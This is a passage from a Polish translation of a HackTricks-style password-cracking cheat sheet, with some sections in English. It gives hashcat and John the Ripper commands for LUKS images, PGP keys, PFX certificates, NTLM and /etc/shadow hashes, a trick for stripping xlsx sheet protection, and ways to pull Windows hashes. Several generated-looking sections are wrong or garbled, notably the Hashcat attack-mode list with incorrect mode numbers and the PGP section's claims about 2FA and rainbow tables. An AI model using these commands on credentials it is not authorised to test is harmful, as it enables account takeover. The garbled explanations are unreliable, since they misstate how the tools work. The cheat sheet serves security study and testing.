Aby chronić się przed atakami brute force, ważne jest stosowanie silnych i unikalnych haseł, wprowadzanie blokad konta po określonej liczbie nieudanych prób logowania oraz korzystanie z uwierzytelniania wieloskładnikowego. Dodatkowo, monitorowanie i rejestrowanie nieudanych prób logowania może pomóc w wykrywaniu i reagowaniu na ataki brute force w odpowiednim czasie.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Inny samouczek dotyczący ataku brute force na Luks: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Klucz prywatny PGP/GPG

A PGP/GPG private key is a cryptographic key used in the Pretty Good Privacy (PGP) or GNU Privacy Guard (GPG) encryption systems. It is used to decrypt messages that have been encrypted with the corresponding public key. The private key should be kept secret and protected, as it grants access to the encrypted data.

In order to brute force a PGP/GPG private key, an attacker would need to try all possible combinations of key values until the correct one is found. This can be a time-consuming process, especially if the key is long and complex.

There are several tools and techniques that can be used to perform a brute force attack on a PGP/GPG private key. These include using specialized software, such as John the Ripper or Hashcat, to automate the process of trying different key values. Additionally, attackers may use password cracking techniques, such as dictionary attacks or rainbow table attacks, to speed up the process.

It is important to note that brute forcing a PGP/GPG private key is a computationally intensive task and may not always be successful. Strong encryption algorithms and long key lengths can significantly increase the time and resources required to crack a private key.

To protect against brute force attacks on PGP/GPG private keys, it is recommended to use strong, complex passphrases and regularly update them. Additionally, enabling two-factor authentication (2FA) can add an extra layer of security to prevent unauthorized access to the private key.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Użyj [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py), a następnie john

### Open Office Pwd Protected Column

Jeśli masz plik xlsx z kolumną chronioną hasłem, możesz ją odblokować:

* **Prześlij go do Google Drive**, a hasło zostanie automatycznie usunięte
* Aby **ręcznie je usunąć**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certyfikaty PFX

PFX (Personal Information Exchange) to format pliku używany do przechowywania kluczy prywatnych, certyfikatów publicznych i innych informacji poufnych. Certyfikaty PFX są często stosowane w celu uwierzytelniania i szyfrowania komunikacji między klientem a serwerem.

#### Generowanie certyfikatów PFX

Aby wygenerować certyfikat PFX, można użyć narzędzi takich jak OpenSSL lub PowerShell. W przypadku OpenSSL, można użyć następującego polecenia:

```plaintext
openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.crt -certfile ca_bundle.crt
```

Gdzie:
- `certificate.pfx` to nazwa pliku wyjściowego
- `private.key` to plik zawierający klucz prywatny
- `certificate.crt` to plik zawierający certyfikat publiczny
- `ca_bundle.crt` to plik zawierający łańcuch certyfikatów CA (opcjonalnie)

#### Ataki brute-force na certyfikaty PFX

Ataki brute-force na certyfikaty PFX polegają na próbie odgadnięcia hasła używanego do zabezpieczenia klucza prywatnego w pliku PFX. Atakujący próbuje różne kombinacje haseł, aż znajdzie poprawne. Istnieje wiele narzędzi dostępnych do przeprowadzania takich ataków, takich jak Hashcat, John the Ripper i Hydra.

Aby zabezpieczyć certyfikaty PFX przed atakami brute-force, zaleca się stosowanie silnych haseł i regularną zmianę haseł. Można również zastosować techniki takie jak blokowanie konta po określonej liczbie nieudanych prób logowania.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować** zadania przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Narzędzia

**Przykłady skrótów:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Listy słów

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Narzędzia do generowania list słów**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Zaawansowany generator klawiatury z konfigurowalnymi znakami bazowymi, mapą klawiszy i trasami.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutacja Johna

Odczytaj _**/etc/john/john.conf**_ i skonfiguruj go.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Ataki Hashcat

* **Atak słownikowy** (`-a 0`) z zastosowaniem reguł

**Hashcat** już zawiera **folder zawierający reguły**, ale można znaleźć [**inne interesujące reguły tutaj**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Atak kombinacyjny z użyciem listy słów**

Możliwe jest **połączenie dwóch list słów w jedną** za pomocą narzędzia hashcat.\
Jeśli lista 1 zawierała słowo **"hello"**, a lista 2 zawierała dwa wiersze z słowami **"world"** i **"earth"**, zostaną wygenerowane słowa `helloworld` i `helloearth`.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Atak maskowy** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Atak słownikowy + maska (`-a 6`) / Atak maski + słownik (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Tryby Hashcat

Hashcat to potężne narzędzie do łamania haseł, które obsługuje wiele różnych trybów ataku. Poniżej przedstawiamy kilka najpopularniejszych trybów:

- **Tryb jednego hasła (0)**: Ten tryb służy do łamania pojedynczego hasła. Wymaga podania hasha, który ma zostać złamany, oraz słownika zawierającego potencjalne hasła.

- **Tryb słownika (1)**: Ten tryb polega na przeglądaniu słownika i sprawdzaniu, czy któryś z jego wpisów pasuje do hasha. Wymaga podania hasha oraz ścieżki do pliku ze słownikiem.

- **Tryb ataku kombinacyjnego (3)**: Ten tryb polega na generowaniu kombinacji z podanych zestawów znaków i sprawdzaniu, czy któryś z nich pasuje do hasha. Wymaga podania hasha oraz zestawów znaków.

- **Tryb ataku maskowego (6)**: Ten tryb polega na generowaniu kombinacji na podstawie maski i sprawdzaniu, czy któryś z nich pasuje do hasha. Wymaga podania hasha oraz maski.

- **Tryb ataku hybrydowego (7)**: Ten tryb łączy atak słownikowy z atakiem kombinacyjnym. Wymaga podania hasha, ścieżki do pliku ze słownikiem oraz zestawów znaków.

- **Tryb ataku regułowego (9)**: Ten tryb polega na zastosowaniu reguł do słownika lub kombinacji. Reguły mogą zmieniać, dodawać lub usuwać znaki w celu zwiększenia szans na złamanie hasła. Wymaga podania hasha, ścieżki do pliku ze słownikiem lub zestawów znaków oraz pliku z regułami.

- **Tryb ataku hybrydowego z maską (Hybrid Mask Attack Mode)**: Ten tryb łączy atak maskowy z atakiem kombinacyjnym. Wymaga podania hasha, maski oraz zestawów znaków.

- **Tryb ataku hybrydowego z regułami (Hybrid Attack Mode)**: Ten tryb łączy atak regułowy z atakiem kombinacyjnym. Wymaga podania hasha, ścieżki do pliku ze słownikiem lub zestawów znaków, pliku z regułami oraz zestawów znaków.

- **Tryb ataku hybrydowego z maską i regułami (Hybrid Mask+Rules Attack Mode)**: Ten tryb łączy atak maskowy z atakiem regułowym i kombinacyjnym. Wymaga podania hasha, maski, pliku z regułami oraz zestawów znaków.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - Plik /etc/shadow

W pliku `/etc/shadow` na systemach Linux przechowywane są zaszyfrowane hasła użytkowników. Aby uzyskać dostęp do tych haseł, można zastosować technikę łamania haseł, znanej jako "brute force" (siłowe łamanie).

## Metoda łamania haseł metodą "brute force"

Metoda "brute force" polega na próbowaniu wszystkich możliwych kombinacji haseł, aż do znalezienia pasującego hasła. Istnieje wiele narzędzi dostępnych do automatycznego łamania haseł, takich jak John the Ripper, Hashcat czy Hydra.

## Krok po kroku

Oto kroki, które można podjąć, aby złamać zaszyfrowane hasła w pliku `/etc/shadow`:

1. Skopiuj zawartość pliku `/etc/shadow` na lokalną maszynę.
2. Użyj narzędzia do łamania haseł, takiego jak John the Ripper, aby przeprowadzić atak "brute force" na skopiowanym pliku.
3. Narzędzie automatycznie będzie próbować różnych kombinacji haseł, aż do znalezienia pasującego hasła.
4. Jeśli narzędzie odnajdzie pasujące hasło, zostanie ono wyświetlone na ekranie.

## Słownik ataków

Aby zwiększyć szanse na sukces, można również użyć słownika ataków. Słownik ataków zawiera listę popularnych haseł, które mogą być używane przez użytkowników. Narzędzia do łamania haseł, takie jak John the Ripper, mogą skorzystać z takiego słownika, aby przyspieszyć proces łamania haseł.

## Ograniczenia

Warto zauważyć, że łamanie haseł metodą "brute force" może być czasochłonne i wymagać dużej mocy obliczeniowej. Im dłuższe i bardziej skomplikowane hasło, tym trudniejsze będzie jego złamanie. Ponadto, nielegalne użycie tej techniki może naruszać prywatność i być karalne zgodnie z prawem.

## Podsumowanie

Łamanie zaszyfrowanych haseł w pliku `/etc/shadow` jest możliwe poprzez zastosowanie metody "brute force". Istnieje wiele narzędzi dostępnych do automatycznego łamania haseł, takich jak John the Ripper, Hashcat czy Hydra. Jednak należy pamiętać, że takie działania mogą naruszać prywatność i być nielegalne.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
## Cracking Windows Hashes

### Introduction

Windows operating systems store user passwords in the form of hashes. These hashes are generated using the NTLM or LM hashing algorithms. As a hacker, if you can obtain these hashes, you can attempt to crack them and gain access to user accounts.

### Obtaining Hashes

There are several ways to obtain Windows hashes, including:

1. **Local Access**: If you have physical access to a Windows machine, you can extract the hashes from the Security Account Manager (SAM) database located in the `%SystemRoot%\system32\config` directory.

2. **Remote Access**: If you have remote access to a Windows machine, you can use tools like `Mimikatz` or `Metasploit` to extract the hashes from memory or the SAM database.

3. **Network Sniffing**: If you have access to a network, you can use tools like `Wireshark` to capture network traffic and extract hashes from protocols like SMB or NTLM.

### Cracking Hashes

Once you have obtained the Windows hashes, you can use various techniques to crack them. Some popular methods include:

1. **Brute-Force**: This involves trying every possible combination of characters until the correct password is found. Tools like `John the Ripper` or `Hashcat` can be used for this purpose.

2. **Dictionary Attack**: This involves using a pre-generated list of commonly used passwords, known as a dictionary, to crack the hashes. Tools like `John the Ripper` or `Hashcat` can be used for this method as well.

3. **Rainbow Tables**: These are precomputed tables that contain a large number of hashes and their corresponding plaintext passwords. Tools like `Ophcrack` or `RainbowCrack` can be used to crack hashes using rainbow tables.

### Conclusion

Cracking Windows hashes can be a time-consuming process, especially if the passwords are complex. However, with the right tools and techniques, it is possible to crack these hashes and gain unauthorized access to user accounts. It is important to note that cracking hashes without proper authorization is illegal and unethical.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
## Cracking Common Application Hashes

### Introduction

Hash cracking is a common technique used in password cracking. In this section, we will discuss how to crack common application hashes.

### Hash Types

There are several common hash types used by applications, including:

- MD5
- SHA1
- SHA256
- SHA512

### Tools for Hash Cracking

There are various tools available for cracking hashes, such as:

- John the Ripper
- Hashcat
- RainbowCrack

### Brute-Force Attack

One method for cracking hashes is the brute-force attack. This involves trying all possible combinations of characters until the correct password is found.

To perform a brute-force attack, you can use tools like John the Ripper or Hashcat. These tools have built-in dictionaries and rulesets that can help speed up the cracking process.

### Wordlist Attack

Another method for cracking hashes is the wordlist attack. This involves using a pre-generated list of commonly used passwords and trying each one until a match is found.

Tools like John the Ripper and Hashcat also support wordlist attacks. You can use their built-in wordlists or create your own custom wordlist.

### Hybrid Attack

A hybrid attack combines elements of both brute-force and wordlist attacks. It involves using a wordlist with additional rules applied to each word, such as appending numbers or special characters.

Tools like John the Ripper and Hashcat support hybrid attacks. You can create custom rulesets to apply to your wordlist.

### Conclusion

Cracking common application hashes can be achieved using various techniques, such as brute-force attacks, wordlist attacks, and hybrid attacks. It is important to use strong and unique passwords to protect your applications from being compromised.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu najbardziej zaawansowanych narzędzi społeczności na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
